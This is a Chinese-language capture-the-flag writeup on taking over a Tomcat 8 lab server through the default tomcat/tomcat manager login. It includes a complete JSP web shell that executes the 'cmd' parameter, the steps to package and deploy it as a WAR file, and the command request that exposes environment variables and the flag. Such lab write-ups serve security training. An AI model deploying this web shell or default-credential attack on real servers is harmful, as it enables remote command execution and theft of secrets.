📝 Tomcat8 弱口令与后台 WAR 包部署 Getshell Writeup

一、 靶机信息与漏洞简介

· 靶机环境：Tomcat 8.0.43 (Vulhub 环境)
· 漏洞类型：弱口令 + 后台 Getshell
· 漏洞原理：Tomcat 管理后台（/manager/html）如果配置了常见的弱口令（如 tomcat/tomcat），攻击者可以直接登录。登录后，Tomcat 提供了 WAR 包部署功能，攻击者可以打包一个恶意的 JSP 木马为 WAR 文件并上传，Tomcat 会自动解压部署，从而实现 Getshell。

二、 渗透过程详解

1. 发现管理后台与弱口令突破

访问靶机根目录，发现是 Tomcat 的默认页面。尝试访问管理后台路径：
http://direct-ctf2.dasctf.com:27658/manager/html
页面弹出了 HTTP Basic 认证框。直接尝试最经典的弱口令组合：

· 用户名：tomcat
· 密码：tomcat
  成功登录，进入 Tomcat Web Application Manager 页面。

2. 制作 JSP 木马与 WAR 包

在本地新建一个名为 shell.jsp 的文件，写入极简的命令执行代码：

jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line = "";
    while((line = br.readLine()) != null){
        out.println(line);
    }
}
%>


关键步骤：新建一个文件夹，将 shell.jsp 放入其中。将该文件夹压缩为 .zip 格式，随后将后缀名修改为 .war（例如命名为 test.war）。

3. 后台部署与应用

在 Tomcat 管理后台页面底部找到 “WAR file to deploy” 区域，选择刚刚制作好的 test.war 文件，点击 Deploy 按钮。页面刷新后，应用列表中出现了解压后的路径。

4. 命令执行与拿 Flag

直接通过浏览器访问上传的 JSP 木马（注意实际解压后可能多套了一层目录）：
http://direct-ctf2.dasctf.com:27658/test/test/shell.jsp?cmd=env
页面直接回显了大量系统环境变量，在第一屏末尾成功找到 Flag：
FLAG=CTF2{0e020771-3528-4290-b1ee-aeb9782039af}

三、 总结与反思

1. WAR 包制作细节：务必注意是把包含 JSP 的文件夹压缩，而不是单独压缩 JSP 文件，否则 Tomcat 可能无法正确解压部署。如果访问报 404，可以尝试在路径中多加一层文件名作为目录。
2. 信息收集：环境变量（env 命令）在容器化（Docker/K8s）的 CTF 靶机中，是藏匿 Flag 的最常见位置，优先级最高。
